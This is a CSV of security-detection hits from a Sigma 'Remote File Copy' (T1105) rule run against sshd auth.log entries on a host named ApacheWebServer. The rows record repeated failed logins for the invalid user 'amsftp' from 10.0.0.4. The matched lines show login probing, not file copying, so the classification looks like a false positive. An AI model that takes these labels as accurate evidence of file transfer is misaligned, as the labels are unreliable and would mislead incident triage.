rule,severity,level,table,count,first_utc,last_utc,timestamp_utc,mitre,matched_row,description,rule_id,rule_file
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=12005; message=Invalid user amsftp from 10.0.0.4 port 55376; log=/var/log/auth.log.3.gz; line_no=46521,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11861; message=Invalid user amsftp from 10.0.0.4 port 55290; log=/var/log/auth.log.3.gz; line_no=46522,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11860; message=Invalid user amsftp from 10.0.0.4 port 55284; log=/var/log/auth.log.3.gz; line_no=46523,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11936; message=Invalid user amsftp from 10.0.0.4 port 55330; log=/var/log/auth.log.3.gz; line_no=46524,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11921; message=Invalid user amsftp from 10.0.0.4 port 55322; log=/var/log/auth.log.3.gz; line_no=46525,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11861; message=Disconnected from invalid user amsftp 10.0.0.4 port 55290 [preauth]; log=/var/log/auth.log.3.gz; line_no=46527,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11913; message=Invalid user amsftp from 10.0.0.4 port 55318; log=/var/log/auth.log.3.gz; line_no=46528,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11860; message=Disconnected from invalid user amsftp 10.0.0.4 port 55284 [preauth]; log=/var/log/auth.log.3.gz; line_no=46530,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11974; message=Invalid user amsftp from 10.0.0.4 port 55364; log=/var/log/auth.log.3.gz; line_no=46531,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11920; message=Invalid user amsftp from 10.0.0.4 port 55320; log=/var/log/auth.log.3.gz; line_no=46532,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:26,T1105,timestamp_utc=2021-11-19 22:44:26; timestamp=Nov 19 22:44:26; host=ApacheWebServer; process=sshd; pid=11959; message=Invalid user amsftp from 10.0.0.4 port 55334; log=/var/log/auth.log.3.gz; line_no=46534,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:26,T1105,timestamp_utc=2021-11-19 22:44:26; timestamp=Nov 19 22:44:26; host=ApacheWebServer; process=sshd; pid=11936; message=Disconnected from invalid user amsftp 10.0.0.4 port 55330 [preauth]; log=/var/log/auth.log.3.gz; line_no=46536,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:27,T1105,timestamp_utc=2021-11-19 22:44:27; timestamp=Nov 19 22:44:27; host=ApacheWebServer; process=sshd; pid=12006; message=Invalid user amsftp from 10.0.0.4 port 55394; log=/var/log/auth.log.3.gz; line_no=46538,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:28,T1105,timestamp_utc=2021-11-19 22:44:28; timestamp=Nov 19 22:44:28; host=ApacheWebServer; process=sshd; pid=11921; message=Disconnected from invalid user amsftp 10.0.0.4 port 55322 [preauth]; log=/var/log/auth.log.3.gz; line_no=46539,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:28,T1105,timestamp_utc=2021-11-19 22:44:28; timestamp=Nov 19 22:44:28; host=ApacheWebServer; process=sshd; pid=11913; message=Disconnected from invalid user amsftp 10.0.0.4 port 55318 [preauth]; log=/var/log/auth.log.3.gz; line_no=46541,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:28,T1105,timestamp_utc=2021-11-19 22:44:28; timestamp=Nov 19 22:44:28; host=ApacheWebServer; process=sshd; pid=12005; message=Disconnected from invalid user amsftp 10.0.0.4 port 55376 [preauth]; log=/var/log/auth.log.3.gz; line_no=46542,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:29,T1105,timestamp_utc=2021-11-19 22:44:29; timestamp=Nov 19 22:44:29; host=ApacheWebServer; process=sshd; pid=11920; message=Disconnected from invalid user amsftp 10.0.0.4 port 55320 [preauth]; log=/var/log/auth.log.3.gz; line_no=46544,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:30,T1105,timestamp_utc=2021-11-19 22:44:30; timestamp=Nov 19 22:44:30; host=ApacheWebServer; process=sshd; pid=11974; message=Disconnected from invalid user amsftp 10.0.0.4 port 55364 [preauth]; log=/var/log/auth.log.3.gz; line_no=46546,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:31,T1105,timestamp_utc=2021-11-19 22:44:31; timestamp=Nov 19 22:44:31; host=ApacheWebServer; process=sshd; pid=11959; message=Disconnected from invalid user amsftp 10.0.0.4 port 55334 [preauth]; log=/var/log/auth.log.3.gz; line_no=46548,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=12066; message=Invalid user amsftp from 10.0.0.4 port 55438; log=/var/log/auth.log.3.gz; line_no=46549,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=12023; message=Invalid user amsftp from 10.0.0.4 port 55402; log=/var/log/auth.log.3.gz; line_no=46550,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=11960; message=Invalid user amsftp from 10.0.0.4 port 55360; log=/var/log/auth.log.3.gz; line_no=46551,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=12006; message=Disconnected from invalid user amsftp 10.0.0.4 port 55394 [preauth]; log=/var/log/auth.log.3.gz; line_no=46553,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:33,T1105,timestamp_utc=2021-11-19 22:44:33; timestamp=Nov 19 22:44:33; host=ApacheWebServer; process=sshd; pid=12097; message=Invalid user amsftp from 10.0.0.4 port 55452; log=/var/log/auth.log.3.gz; line_no=46554,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:33,T1105,timestamp_utc=2021-11-19 22:44:33; timestamp=Nov 19 22:44:33; host=ApacheWebServer; process=sshd; pid=12056; message=Invalid user amsftp from 10.0.0.4 port 55414; log=/var/log/auth.log.3.gz; line_no=46555,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:34,T1105,timestamp_utc=2021-11-19 22:44:34; timestamp=Nov 19 22:44:34; host=ApacheWebServer; process=sshd; pid=12023; message=Disconnected from invalid user amsftp 10.0.0.4 port 55402 [preauth]; log=/var/log/auth.log.3.gz; line_no=46557,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:34,T1105,timestamp_utc=2021-11-19 22:44:34; timestamp=Nov 19 22:44:34; host=ApacheWebServer; process=sshd; pid=11960; message=Disconnected from invalid user amsftp 10.0.0.4 port 55360 [preauth]; log=/var/log/auth.log.3.gz; line_no=46559,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:34,T1105,timestamp_utc=2021-11-19 22:44:34; timestamp=Nov 19 22:44:34; host=ApacheWebServer; process=sshd; pid=12080; message=Invalid user amsftp from 10.0.0.4 port 55448; log=/var/log/auth.log.3.gz; line_no=46560,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:35,T1105,timestamp_utc=2021-11-19 22:44:35; timestamp=Nov 19 22:44:35; host=ApacheWebServer; process=sshd; pid=12050; message=Invalid user amsftp from 10.0.0.4 port 55408; log=/var/log/auth.log.3.gz; line_no=46562,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:35,T1105,timestamp_utc=2021-11-19 22:44:35; timestamp=Nov 19 22:44:35; host=ApacheWebServer; process=sshd; pid=12066; message=Disconnected from invalid user amsftp 10.0.0.4 port 55438 [preauth]; log=/var/log/auth.log.3.gz; line_no=46564,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:35,T1105,timestamp_utc=2021-11-19 22:44:35; timestamp=Nov 19 22:44:35; host=ApacheWebServer; process=sshd; pid=12056; message=Disconnected from invalid user amsftp 10.0.0.4 port 55414 [preauth]; log=/var/log/auth.log.3.gz; line_no=46566,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:36,T1105,timestamp_utc=2021-11-19 22:44:36; timestamp=Nov 19 22:44:36; host=ApacheWebServer; process=sshd; pid=12117; message=Invalid user amsftp from 10.0.0.4 port 55486; log=/var/log/auth.log.3.gz; line_no=46568,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:36,T1105,timestamp_utc=2021-11-19 22:44:36; timestamp=Nov 19 22:44:36; host=ApacheWebServer; process=sshd; pid=12067; message=Invalid user amsftp from 10.0.0.4 port 55442; log=/var/log/auth.log.3.gz; line_no=46569,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:37,T1105,timestamp_utc=2021-11-19 22:44:37; timestamp=Nov 19 22:44:37; host=ApacheWebServer; process=sshd; pid=12057; message=Invalid user amsftp from 10.0.0.4 port 55430; log=/var/log/auth.log.3.gz; line_no=46570,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:37,T1105,timestamp_utc=2021-11-19 22:44:37; timestamp=Nov 19 22:44:37; host=ApacheWebServer; process=sshd; pid=12097; message=Disconnected from invalid user amsftp 10.0.0.4 port 55452 [preauth]; log=/var/log/auth.log.3.gz; line_no=46571,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:37,T1105,timestamp_utc=2021-11-19 22:44:37; timestamp=Nov 19 22:44:37; host=ApacheWebServer; process=sshd; pid=12080; message=Disconnected from invalid user amsftp 10.0.0.4 port 55448 [preauth]; log=/var/log/auth.log.3.gz; line_no=46573,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:38,T1105,timestamp_utc=2021-11-19 22:44:38; timestamp=Nov 19 22:44:38; host=ApacheWebServer; process=sshd; pid=12057; message=Disconnected from invalid user amsftp 10.0.0.4 port 55430 [preauth]; log=/var/log/auth.log.3.gz; line_no=46575,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:38,T1105,timestamp_utc=2021-11-19 22:44:38; timestamp=Nov 19 22:44:38; host=ApacheWebServer; process=sshd; pid=12098; message=Invalid user amsftp from 10.0.0.4 port 55454; log=/var/log/auth.log.3.gz; line_no=46576,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:39,T1105,timestamp_utc=2021-11-19 22:44:39; timestamp=Nov 19 22:44:39; host=ApacheWebServer; process=sshd; pid=12050; message=Disconnected from invalid user amsftp 10.0.0.4 port 55408 [preauth]; log=/var/log/auth.log.3.gz; line_no=46578,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:39,T1105,timestamp_utc=2021-11-19 22:44:39; timestamp=Nov 19 22:44:39; host=ApacheWebServer; process=sshd; pid=12125; message=Invalid user amsftp from 10.0.0.4 port 55506; log=/var/log/auth.log.3.gz; line_no=46579,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:40,T1105,timestamp_utc=2021-11-19 22:44:40; timestamp=Nov 19 22:44:40; host=ApacheWebServer; process=sshd; pid=12146; message=Invalid user amsftp from 10.0.0.4 port 55516; log=/var/log/auth.log.3.gz; line_no=46580,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:40,T1105,timestamp_utc=2021-11-19 22:44:40; timestamp=Nov 19 22:44:40; host=ApacheWebServer; process=sshd; pid=12166; message=Invalid user amsftp from 10.0.0.4 port 55534; log=/var/log/auth.log.3.gz; line_no=46581,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:41,T1105,timestamp_utc=2021-11-19 22:44:41; timestamp=Nov 19 22:44:41; host=ApacheWebServer; process=sshd; pid=12146; message=Disconnected from invalid user amsftp 10.0.0.4 port 55516 [preauth]; log=/var/log/auth.log.3.gz; line_no=46583,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:41,T1105,timestamp_utc=2021-11-19 22:44:41; timestamp=Nov 19 22:44:41; host=ApacheWebServer; process=sshd; pid=12124; message=Invalid user amsftp from 10.0.0.4 port 55496; log=/var/log/auth.log.3.gz; line_no=46584,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:42,T1105,timestamp_utc=2021-11-19 22:44:42; timestamp=Nov 19 22:44:42; host=ApacheWebServer; process=sshd; pid=12115; message=Invalid user amsftp from 10.0.0.4 port 55478; log=/var/log/auth.log.3.gz; line_no=46585,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:42,T1105,timestamp_utc=2021-11-19 22:44:42; timestamp=Nov 19 22:44:42; host=ApacheWebServer; process=sshd; pid=12067; message=Disconnected from invalid user amsftp 10.0.0.4 port 55442 [preauth]; log=/var/log/auth.log.3.gz; line_no=46587,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:42,T1105,timestamp_utc=2021-11-19 22:44:42; timestamp=Nov 19 22:44:42; host=ApacheWebServer; process=sshd; pid=12117; message=Disconnected from invalid user amsftp 10.0.0.4 port 55486 [preauth]; log=/var/log/auth.log.3.gz; line_no=46589,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:43,T1105,timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12124; message=Disconnected from invalid user amsftp 10.0.0.4 port 55496 [preauth]; log=/var/log/auth.log.3.gz; line_no=46591,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:43,T1105,timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; message=Invalid user amsftp from 10.0.0.4 port 55476; log=/var/log/auth.log.3.gz; line_no=46593,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:43,T1105,timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; message=Disconnected from invalid user amsftp 10.0.0.4 port 55476 [preauth]; log=/var/log/auth.log.3.gz; line_no=46595,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:44,T1105,timestamp_utc=2021-11-19 22:44:44; timestamp=Nov 19 22:44:44; host=ApacheWebServer; process=sshd; pid=12145; message=Invalid user amsftp from 10.0.0.4 port 55514; log=/var/log/auth.log.3.gz; line_no=46596,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:46,T1105,timestamp_utc=2021-11-19 22:44:46; timestamp=Nov 19 22:44:46; host=ApacheWebServer; process=sshd; pid=12098; message=Disconnected from invalid user amsftp 10.0.0.4 port 55454 [preauth]; log=/var/log/auth.log.3.gz; line_no=46598,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:47,T1105,timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12145; message=Disconnected from invalid user amsftp 10.0.0.4 port 55514 [preauth]; log=/var/log/auth.log.3.gz; line_no=46600,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:47,T1105,timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12125; message=Disconnected from invalid user amsftp 10.0.0.4 port 55506 [preauth]; log=/var/log/auth.log.3.gz; line_no=46602,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
